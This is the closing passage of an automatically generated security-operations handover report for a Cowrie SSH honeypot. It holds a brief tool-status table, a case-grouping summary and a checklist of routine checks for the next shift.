| Tool 33  | YARA Classifier             | ✅ 4 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 10 priority case(s) shown individually · 24 recon entry/entries in table (2 group(s) consolidating 10 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-03-28T14:30:41Z_
